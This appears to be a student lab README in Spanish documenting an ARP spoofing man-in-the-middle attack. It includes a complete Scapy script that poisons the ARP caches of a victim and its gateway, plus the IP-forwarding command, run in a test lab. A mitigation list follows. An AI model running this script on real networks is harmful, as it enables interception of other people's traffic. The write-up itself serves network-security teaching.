# REPOSITORIO 2

# ARP Man-in-the-Middle – Scapy

## Autor

**Mariana Doñe Lara**  
**Matrícula:** 20241200

---

## 1️⃣ Introducción

En este laboratorio desarrollé un script para realizar un ataque **Man-in-the-Middle** mediante **ARP Spoofing**, permitiendo interceptar el tráfico entre un host Windows y su gateway.

El ataque fue ejecutado desde Kali Linux en un entorno de pruebas controlado.

---

## 2️⃣ Objetivo del script

El objetivo es **posicionar al host atacante entre la víctima y el router**, manipulando las tablas ARP para redirigir el tráfico a través de Kali Linux.

---

## 3️⃣ Topología de red utilizada

### 🔹 Dispositivos

- Router (Gateway)
    
- Switch
    
- Kali Linux (Atacante)
    
- Windows 10 (Víctima)
    

### 🔹 Direccionamiento IP

|Dispositivo|IP|
|---|---|
|Router|12.0.0.1|
|Kali Linux|12.0.0.10|
|Windows|12.0.0.20|

---

## 4️⃣ Script utilizado

📁 **Archivo:** `arp_mitm.py`

from scapy.all import ARP, send
import time

victim_ip = "12.0.0.20"
gateway_ip = "12.0.0.1"

print("[*] Iniciando ARP MITM")

try:
    while True:
        send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip), verbose=False)
        send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip), verbose=False)
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[!] Ataque detenido")

---

## 5️⃣ Parámetros usados

- IP víctima: `12.0.0.20`
    
- IP gateway: `12.0.0.1`
    
- Intervalo de envío: 2 segundos
    

---

## 6️⃣ Requisito previo

Habilitar el reenvío de paquetes en Kali Linux:

`echo 1 > /proc/sys/net/ipv4/ip_forward`

---

## 7️⃣ Capturas de pantalla

Las evidencias muestran:

- Ejecución del ataque
    
- Tabla ARP de Windows alterada
    
- MAC del gateway reemplazada por la MAC de Kali
    

---

## 8️⃣ Requisitos

- Kali Linux
    
- Python 3
    
- Scapy
    
- Acceso a red local
    
- Permisos root
    

---

## 9️⃣ Medidas de mitigación

- Dynamic ARP Inspection
    
- ARP estático
    
- Segmentación por VLAN
    
- Seguridad de puertos en el switch
    

---

## 🔟 Conclusión

El ataque ARP MITM demuestra la falta de autenticación en ARP y la importancia de implementar mecanismos de seguridad en redes locales.
